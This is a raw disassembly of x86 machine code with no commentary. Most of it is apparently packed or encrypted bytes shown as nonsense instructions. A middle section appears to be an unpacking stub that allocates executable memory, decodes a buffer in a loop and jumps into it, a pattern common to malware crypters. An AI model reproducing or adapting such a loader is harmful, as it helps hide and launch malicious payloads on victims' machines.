  4213aa:	cmp    esi,DWORD PTR ds:0x95bbc9f6
  4213b0:	ins    DWORD PTR es:[edi],dx
  4213b1:	mov    dl,0x53
  4213b3:	mov    ds:0x3c16fe8,eax
  4213b8:	sub    bh,cl
  4213ba:	shl    DWORD PTR [esi],1
  4213bc:	int3   
  4213bd:	test   eax,0x289d7208
  4213c2:	add    ebx,ecx
  4213c4:	out    dx,al
  4213c5:	inc    edi
  4213c6:	xchg   ebx,eax
  4213c7:	inc    edi
  4213c8:	dec    ecx
  4213c9:	(bad)  
  4213ca:	pop    eax
  4213cb:	jp     0x4213c5
  4213cd:	mov    ds:0xca300eec,al
  4213d2:	add    DWORD PTR [edx],eax
  4213d4:	icebp  
  4213d5:	mov    ds:0xa22d37b,eax
  4213da:	mov    dl,0xc8
  4213dc:	ss cs push ebp
  4213df:	pop    edx
  4213e0:	in     eax,dx
  4213e1:	out    dx,eax
  4213e2:	push   0xa84ef0f5
  4213e7:	dec    ebx
  4213e8:	cld    
  4213e9:	fsubr  QWORD PTR [ecx]
  4213eb:	repnz or BYTE PTR [esi-0x45f10e53],dl
  4213f2:	mul    BYTE PTR [edi-0x73968699]
  4213f8:	(bad)  
  4213f9:	mov    ah,0xb3
  4213fb:	packsswb mm3,mm7
  4213fe:	std    
  4213ff:	sar    DWORD PTR [edi-0x561ec39f],cl
  421405:	fimul  DWORD PTR [edi]
  421407:	mov    bh,0x7
  421409:	(bad)  
  42140a:	jnp    0x421483
  42140c:	ret    0xebcd
  42140f:	call   0x52f5:0x226c56bc
  421416:	test   cl,0x9a
  421419:	call   0x31e:0xb46e08fa
  421420:	and    al,0x74
  421422:	adc    ecx,DWORD PTR [edx+0x4f4eaa3f]
  421428:	icebp  
  421429:	add    BYTE PTR [edi-0x2c],bl
  42142c:	or     bl,BYTE PTR [esi]
  42142e:	and    BYTE PTR [ebx+0x2de9574],cl
  421434:	outs   dx,DWORD PTR ds:[esi]
  421435:	cmp    al,0xc9
  421437:	xchg   DWORD PTR [esp+ecx*4],edx
  42143a:	adc    DWORD PTR [ecx+0x270d5d54],esp
  421440:	icebp  
  421441:	dec    ebx
  421442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421443:	repnz dec eax
  421445:	out    dx,eax
  421446:	cwde   
  421447:	rcl    BYTE PTR [ebx],0xcb
  42144a:	mov    WORD PTR [edi],?
  42144c:	cmc    
  42144d:	dec    edi
  42144e:	ss dec ecx
  421450:	jno    0x421474
  421452:	cmp    al,0xfd
  421454:	rcr    DWORD PTR [ecx-0x82f6a16],0x7d
  42145b:	pop    esp
  42145c:	call   0x14f8:0x2ae5cbb5
  421463:	dec    edx
  421464:	call   0x482699b6
  421469:	xor    bh,0xf1
  42146c:	fcomp  DWORD PTR [ebx]
  42146e:	(bad)  
  42146f:	jl     0x42141a
  421471:	ja     0x42140b
  421473:	mov    dl,0x6c
  421475:	sub    esp,DWORD PTR [ecx-0x4a]
  421478:	inc    esp
  421479:	test   DWORD PTR [esi],ebp
  42147b:	jmp    0x9f60:0xcf09067d
  421482:	xor    al,0xda
  421484:	xor    BYTE PTR [edi],ah
  421486:	push   0x692f4d6b
  42148b:	mov    al,ds:0x514c5cbd
  421490:	shl    BYTE PTR [ebp-0x78],1
  421493:	adc    al,0x90
  421495:	mov    dl,0x10
  421497:	push   esp
  421498:	mov    edi,0x6c32f5b6
  42149d:	push   edi
  42149e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42149f:	sub    BYTE PTR [ebx-0x35778027],bh
  4214a5:	mov    esp,0xa2f06b8a
  4214aa:	call   0xed8c:0xbdee74fd
  4214b1:	add    al,0x5a
  4214b3:	out    0x10,eax
  4214b5:	mov    al,0x25
  4214b7:	call   0x1c3f2070
  4214bc:	fcom   DWORD PTR [ebp-0x33]
  4214bf:	push   0x58
  4214c1:	dec    edi
  4214c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214c3:	sub    BYTE PTR [edx-0x39],ah
  4214c6:	sbb    eax,0xc0339824
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0xf5f85b20
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0x386ef5d0
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	jmp    FWORD PTR [esi]
  4217ea:	mov    al,0x19
  4217ec:	mov    DWORD PTR ds:[ecx-0x14],edi
  4217f0:	sbb    eax,0x69780318
  4217f5:	add    al,0x9c
  4217f7:	jmp    0x1dec:0x798a8689
  4217fe:	sbb    al,0x3
  421800:	js     0x42182b
  421802:	sti    
  421803:	arpl   dx,bp
  421805:	mov    DWORD PTR [esi],edi
  421807:	mov    bh,BYTE PTR [ecx-0x14]
  42180a:	sbb    eax,0x6978031c
  42180f:	sti    
  421810:	arpl   dx,bp
  421812:	mov    DWORD PTR [esi],edi
  421814:	mov    bh,BYTE PTR [ecx-0x14]
  421817:	sbb    eax,0x6978031c
  42181c:	sti    
  42181d:	arpl   dx,bp
  42181f:	mov    DWORD PTR [esi],edi
  421821:	mov    bh,BYTE PTR [ecx-0x14]
  421824:	sbb    eax,0x697803e4
  421829:	cmc    
  42182a:	jl     0x42187c
  42182c:	xchg   DWORD PTR [esi],edi
  42182e:	ds jo  0x421852
  421831:	cmp    al,0xa4
  421833:	add    dh,BYTE PTR [esp+eiz*4]
  421836:	fidiv  DWORD PTR [edi]
  421838:	and    al,0x4d
  42183b:	stos   BYTE PTR es:[edi],al
  42183c:	or     DWORD PTR [esi+0x19717b72],ebx
  421842:	add    al,0xdb
  421844:	add    BYTE PTR [ebx+0xde550e7],cl
  42184a:	int3   
  42184b:	jg     0x4218c6
  42184d:	and    ecx,DWORD PTR [edx]
  42184f:	sbb    al,0x95
  421851:	inc    ebx
  421852:	and    edi,0x1e
  421855:	into   
  421856:	ss mov edi,0x1c6c713d
  42185c:	or     al,0xd5
  42185e:	outs   dx,BYTE PTR ds:[esi]
  42185f:	out    0x83,eax
  421861:	sbb    cl,BYTE PTR [edx+0x1c1dec79]
  421867:	add    edi,DWORD PTR [eax+0x6e]
  42186a:	bound  ebx,QWORD PTR [edi+0x18c6cab3]
  421870:	jae    0x421821
  421872:	in     eax,0x8e
  421874:	or     DWORD PTR [ebx],edi
  421876:	xchg   ecx,eax
  421877:	imul   ebp,DWORD PTR [ecx-0x4e],0x268032ec
  42187e:	adc    al,0x8f
  421880:	push   ss
  421881:	pop    ebx
  421882:	sbb    eax,0x12a1f151
  421887:	sbb    esi,DWORD PTR [edx+edx*8]
  42188a:	sbb    al,0xd5
  42188c:	pop    ss
  42188d:	je     0x42188a
  42188f:	jmp    0x7883:0xd3edd763
  421896:	jb     0x421883
  421898:	out    0x57,al
  42189a:	pushf  
  42189b:	adc    dh,BYTE PTR [edx+0x23]
  42189e:	add    esi,ecx
  4218a0:	loopne 0x421865
  4218a2:	mov    esi,0xe5b4738b
  4218a7:	mov    cs,WORD PTR [ecx]
  4218a9:	cmp    edx,DWORD PTR [ecx+0x70c26968]
  4218af:	lods   al,BYTE PTR ds:[esi]
  4218b0:	add    dh,0x34
  4218b3:	popf   
  4218b4:	push   ss
  4218b5:	dec    esi
  4218b6:	cmp    bl,0xf1
  4218b9:	cmp    ecx,DWORD PTR [edi-0x7e7dcb4c]
  4218bf:	jle    0x4218d8
  4218c1:	inc    esp
  4218c2:	data16 jo 0x421928
  4218c5:	mov    ecx,0x6683789b
  4218ca:	out    dx,eax
  4218cb:	jbe    0x4218b3
  4218cd:	pop    edi
  4218ce:	in     al,0x91
  4218d0:	jb     0x42190d
  4218d2:	xchg   edx,eax
  4218d3:	add    BYTE PTR [edx+0x7318c6ca],al
  4218d9:	in     al,dx
  4218da:	sbb    eax,0x6978031c
  4218df:	sti    
  4218e0:	arpl   WORD PTR [edx+0x358a3ecc],di
  4218e6:	in     eax,dx
  4218e7:	pop    ds
  4218e8:	sbb    al,0xa3
  4218ea:	test   al,0x2
  4218ec:	mov    ah,0x63
  4218ee:	jmp    0x1dec:0x798a3e89
  4218f5:	cld    
  4218f6:	add    edi,DWORD PTR [ebx+0x68]
  4218f9:	lock (bad) 
  4218fb:	loopne 0x421886
  4218fd:	ds fs jge 0x4218ed
  421901:	sbb    eax,0x697805a0
  421906:	sti    
  421907:	arpl   dx,bp
  421909:	cwde   
  42190a:	or     DWORD PTR [edx+0x1c0dec79],0x3
  421911:	js     0x42197c
  421913:	(bad)  
  421914:	arpl   dx,bp
  421916:	mov    DWORD PTR [edi-0x76],edi
  421919:	jns    0x421917
  42191b:	sbb    eax,0x697a031c
  421920:	sti    
  421921:	jmp    0x798a:0x3e88
  421927:	in     al,dx
  421928:	sbb    eax,0x69790319
  42192d:	sti    
  42192e:	arpl   dx,bp
  421930:	mov    DWORD PTR [esi],edi
  421932:	fidiv  DWORD PTR [ebp-0x14]
  421935:	sbb    eax,0x68780318
  42193a:	pop    ds
  42193b:	jmp    0xf98a:0x3e8b
  421941:	in     al,dx
  421942:	sbb    eax,0x7978030c
  421947:	sti    
  421948:	arpl   dx,bp
  42194a:	mov    DWORD PTR [esi],ebp
  42194c:	mov    bh,BYTE PTR [ecx-0x4]
  42194f:	sbb    eax,0x6978031c
  421954:	sti    
  421955:	jae    0x421941
  421957:	mov    DWORD PTR [esi],edi
  421959:	mov    bh,BYTE PTR [ecx-0x14]
  42195c:	sbb    eax,0x6978031c
  421961:	cvtps2pd xmm4,xmm6
  421964:	mov    DWORD PTR [edi-0x77],edx
  421967:	jns    0x421955
  421969:	sbb    eax,0x267808ec
  42196e:	mov    dl,0x63
  421970:	jmp    0x1dec:0x798a3e89
  421977:	sbb    al,0x3
  421979:	js     0x4219e4
  42197b:	sti    
  42197c:	arpl   dx,bp
  42197e:	mov    DWORD PTR [esi],edi
  421980:	mov    bh,BYTE PTR [ecx-0x14]
  421983:	sbb    eax,0x6978031c
  421988:	sti    
  421989:	arpl   dx,bp
  42198b:	mov    DWORD PTR [esi],edi
  42198d:	mov    bh,BYTE PTR [ecx-0x14]
  421990:	sbb    eax,0x6978031c
  421995:	sti    
  421996:	arpl   dx,bp
  421998:	mov    DWORD PTR [esi],edi
  42199a:	mov    bh,BYTE PTR [ecx-0x14]
  42199d:	sbb    eax,0x6978031c
  4219a2:	sti    
  4219a3:	arpl   dx,bp
  4219a5:	mov    DWORD PTR [esi],edi
  4219a7:	mov    bh,BYTE PTR [ecx-0x14]
  4219aa:	sbb    eax,0x6978031c
  4219af:	sti    
  4219b0:	arpl   dx,bp
  4219b2:	mov    DWORD PTR [esi],edi
  4219b4:	mov    bh,BYTE PTR [ecx-0x14]
  4219b7:	sbb    eax,0x6978031c
  4219bc:	sti    
  4219bd:	arpl   dx,bp
  4219bf:	mov    DWORD PTR [esi],edi
  4219c1:	mov    bh,BYTE PTR [ecx-0x14]
  4219c4:	sbb    eax,0x6978031c
  4219c9:	sti    
  4219ca:	arpl   dx,bp
  4219cc:	mov    DWORD PTR [esi],edi
  4219ce:	mov    bh,BYTE PTR [ecx-0x14]
  4219d1:	sbb    eax,0x6978031c
  4219d6:	sti    
  4219d7:	arpl   dx,bp
  4219d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219da:	dec    edx
  4219db:	out    dx,eax
  4219dc:	add    DWORD PTR [eax+0x78031c1d],ebx
  4219e2:	mov    eax,esi
  4219e4:	arpl   dx,bp
  4219e6:	cdq    
  4219e7:	mov    bh,BYTE PTR ds:[ecx+0x38]
  4219eb:	sbb    DWORD PTR [ebx+eax*1],ebx
  4219ee:	jl     0x421a59
  4219f0:	sti    
  4219f1:	xor    ebp,DWORD PTR [edi+0x36de0cca]
  4219f7:	in     al,dx
  4219f8:	sbb    eax,0x6978031c
  4219fd:	(bad)  [ebx-0x16]
  421a00:	imul   edx,DWORD PTR [eax],0x7e9e0af8
  421a06:	sbb    al,0x3
  421a08:	js     0x421a73
  421a0a:	fwait
  421a0b:	arpl   dx,bp
  421a0d:	mov    esi,ecx
  421a0f:	cmp    DWORD PTR [ecx-0x14],0x78031c47
  421a16:	mov    cl,0xff
  421a18:	arpl   dx,bp
  421a1a:	mov    DWORD PTR [esi],edi
  421a1c:	mov    bh,BYTE PTR [ecx-0x14]
  421a1f:	sbb    eax,0x6978031c
  421a24:	sti    
  421a25:	inc    ebx
  421a26:	jmp    0x1dec:0x798ade89
  421a2d:	sbb    al,0x3
  421a2f:	js     0x421a9a
  421a31:	sti    
  421a32:	arpl   dx,bp
  421a34:	mov    DWORD PTR [esi],edi
  421a36:	mov    bh,BYTE PTR [ecx-0x14]
  421a39:	sbb    eax,0x6978031c
  421a3e:	sti    
  421a3f:	arpl   dx,bp
  421a41:	mov    DWORD PTR [esi],edi
  421a43:	mov    bh,BYTE PTR [ecx-0x14]
  421a46:	sbb    eax,0x6978031c
  421a4b:	sti    
  421a4c:	arpl   dx,bp
  421a4e:	mov    DWORD PTR [esi],edi
  421a50:	mov    bh,BYTE PTR [ecx-0x14]
  421a53:	sbb    eax,0x6978031c
  421a58:	sti    
  421a59:	arpl   dx,bp
  421a5b:	mov    DWORD PTR [esi],edi
  421a5d:	mov    bh,BYTE PTR [ecx-0x14]
  421a60:	sbb    eax,0x6978031c
  421a65:	sti    
  421a66:	arpl   dx,bp
  421a68:	mov    DWORD PTR [esi],edi
  421a6a:	mov    bh,BYTE PTR [ecx-0x14]
  421a6d:	sbb    eax,0x6978031c
  421a72:	sti    
  421a73:	arpl   dx,bp
  421a75:	mov    DWORD PTR [esi],edi
  421a77:	mov    bh,BYTE PTR [ecx-0x14]
  421a7a:	sbb    eax,0x6978031c
  421a7f:	sti    
  421a80:	arpl   dx,bp
  421a82:	mov    DWORD PTR [esi],edi
  421a84:	mov    bh,BYTE PTR [ecx-0x14]
  421a87:	sbb    eax,0x6978031c
  421a8c:	sti    
  421a8d:	arpl   dx,bp
  421a8f:	mov    DWORD PTR [esi],edi
  421a91:	mov    bh,BYTE PTR [ecx-0x14]
  421a94:	sbb    eax,0x6978031c
  421a99:	sti    
  421a9a:	arpl   dx,bp
  421a9c:	mov    DWORD PTR [esi],edi
  421a9e:	mov    bh,BYTE PTR [ecx-0x14]
  421aa1:	sbb    eax,0x6978031c
  421aa6:	sti    
  421aa7:	arpl   dx,bp
  421aa9:	mov    DWORD PTR [esi],edi
  421aab:	mov    bh,BYTE PTR [ecx-0x14]
  421aae:	sbb    eax,0x6978031c
  421ab3:	sti    
  421ab4:	arpl   dx,bp
  421ab6:	mov    DWORD PTR [esi],edi
  421ab8:	mov    bh,BYTE PTR [ecx-0x14]
  421abb:	sbb    eax,0x6978031c
  421ac0:	sti    
  421ac1:	arpl   dx,bp
  421ac3:	mov    DWORD PTR [esi],edi
  421ac5:	mov    bh,BYTE PTR [ecx-0x14]
  421ac8:	sbb    eax,0x6978031c
  421acd:	sti    
  421ace:	arpl   dx,bp
  421ad0:	mov    DWORD PTR [esi],edi
  421ad2:	mov    bh,BYTE PTR [ecx-0x14]
  421ad5:	sbb    eax,0x6978031c
  421ada:	sti    
  421adb:	arpl   dx,bp
  421add:	mov    DWORD PTR [esi],edi
  421adf:	mov    bh,BYTE PTR [ecx-0x14]
  421ae2:	sbb    eax,0x6978031c
  421ae7:	sti    
  421ae8:	arpl   dx,bp
  421aea:	mov    DWORD PTR [esi],edi
  421aec:	mov    bh,BYTE PTR [ecx-0x14]
  421aef:	sbb    eax,0x6978031c
  421af4:	sti    
  421af5:	arpl   dx,bp
  421af7:	mov    DWORD PTR [esi],edi
  421af9:	mov    bh,BYTE PTR [ecx-0x14]
  421afc:	sbb    eax,0x6978031c
  421b01:	sti    
  421b02:	arpl   dx,bp
  421b04:	mov    DWORD PTR [esi],edi
  421b06:	mov    bh,BYTE PTR [ecx-0x14]
  421b09:	sbb    eax,0x6978031c
  421b0e:	sti    
  421b0f:	arpl   dx,bp
  421b11:	mov    DWORD PTR [esi],edi
  421b13:	mov    bh,BYTE PTR [ecx-0x14]
  421b16:	sbb    eax,0x6978031c
  421b1b:	sti    
  421b1c:	arpl   dx,bp
  421b1e:	mov    DWORD PTR [esi],edi
  421b20:	mov    bh,BYTE PTR [ecx-0x14]
  421b23:	sbb    eax,0x6978031c
  421b28:	sti    
  421b29:	arpl   dx,bp
  421b2b:	mov    DWORD PTR [esi],edi
  421b2d:	mov    bh,BYTE PTR [ecx-0x14]
  421b30:	sbb    eax,0x6978031c
  421b35:	sti    
  421b36:	arpl   dx,bp
  421b38:	mov    DWORD PTR [esi],edi
  421b3a:	mov    bh,BYTE PTR [ecx-0x14]
  421b3d:	sbb    eax,0x6978031c
  421b42:	sti    
  421b43:	arpl   dx,bp
  421b45:	mov    DWORD PTR [esi],edi
  421b47:	mov    bh,BYTE PTR [ecx-0x14]
  421b4a:	sbb    eax,0x6978031c
  421b4f:	sti    
  421b50:	arpl   dx,bp
  421b52:	mov    DWORD PTR [esi],edi
  421b54:	mov    bh,BYTE PTR [ecx-0x14]
  421b57:	sbb    eax,0x6978031c
  421b5c:	sti    
  421b5d:	arpl   dx,bp
  421b5f:	mov    DWORD PTR [esi],edi
  421b61:	mov    bh,BYTE PTR [ecx-0x14]
  421b64:	sbb    eax,0x6978031c
  421b69:	sti    
  421b6a:	arpl   dx,bp
  421b6c:	mov    DWORD PTR [esi],edi
  421b6e:	mov    bh,BYTE PTR [ecx-0x14]
  421b71:	sbb    eax,0x6978031c
  421b76:	sti    
  421b77:	arpl   dx,bp
  421b79:	mov    DWORD PTR [esi],edi
  421b7b:	mov    bh,BYTE PTR [ecx-0x14]
  421b7e:	sbb    eax,0x6978031c
  421b83:	sti    
  421b84:	arpl   dx,bp
  421b86:	mov    DWORD PTR [esi],edi
  421b88:	mov    bh,BYTE PTR [ecx-0x14]
  421b8b:	sbb    eax,0x6978031c
  421b90:	sti    
  421b91:	arpl   dx,bp
  421b93:	mov    DWORD PTR [esi],edi
  421b95:	mov    bh,BYTE PTR [ecx-0x14]
  421b98:	sbb    eax,0x6978031c
  421b9d:	sti    
  421b9e:	arpl   dx,bp
  421ba0:	mov    DWORD PTR [esi],edi
  421ba2:	mov    bh,BYTE PTR [ecx-0x14]
  421ba5:	sbb    eax,0x6978031c
  421baa:	sti    
  421bab:	arpl   dx,bp
  421bad:	mov    DWORD PTR [esi],edi
  421baf:	mov    bh,BYTE PTR [ecx-0x14]
  421bb2:	sbb    eax,0x6978031c
  421bb7:	sti    
  421bb8:	arpl   dx,bp
  421bba:	mov    DWORD PTR [esi],edi
  421bbc:	mov    bh,BYTE PTR [ecx-0x14]
  421bbf:	sbb    eax,0x6978031c
  421bc4:	sti    
  421bc5:	arpl   dx,bp
  421bc7:	mov    DWORD PTR [esi],edi
  421bc9:	mov    bh,BYTE PTR [ecx-0x14]
  421bcc:	sbb    eax,0x6978031c
  421bd1:	sti    
  421bd2:	arpl   dx,bp
  421bd4:	mov    DWORD PTR [esi],edi
  421bd6:	mov    bh,BYTE PTR [ecx-0x14]
  421bd9:	sbb    eax,0x6978031c
  421bde:	sti    
  421bdf:	arpl   dx,bp
  421be1:	mov    DWORD PTR [esi],edi
  421be3:	mov    bh,BYTE PTR [ecx-0x14]
  421be6:	sbb    eax,0xc117031c
  421beb:	lock arpl bp,ax
  421bee:	mov    DWORD PTR [esi],edi
  421bf0:	call   0x9d9:0xbe37ec79
  421bf7:	(bad)  
  421bf9:	dec    esi
  421bfa:	je     0x421c0a
  421bfc:	outs   dx,BYTE PTR ds:[esi]
  421bfd:	addr16 dec edi
  421bff:	add    al,0xe
  421c01:	test   al,0x96
  421c03:	push   ds
  421c04:	sbb    BYTE PTR [edi+0x39],bh
  421c07:	stc    
  421c08:	cmp    BYTE PTR [ecx-0x68f7eb64],cl
  421c0e:	popf   
  421c0f:	lds    edx,FWORD PTR [esi+0xb]
  421c12:	imul   ebx,DWORD PTR [ebx+edx*8-0x46],0x71
  421c17:	cmp    ebp,DWORD PTR [esi-0x32]
  421c1a:	sbb    eax,0x3cf0a43b
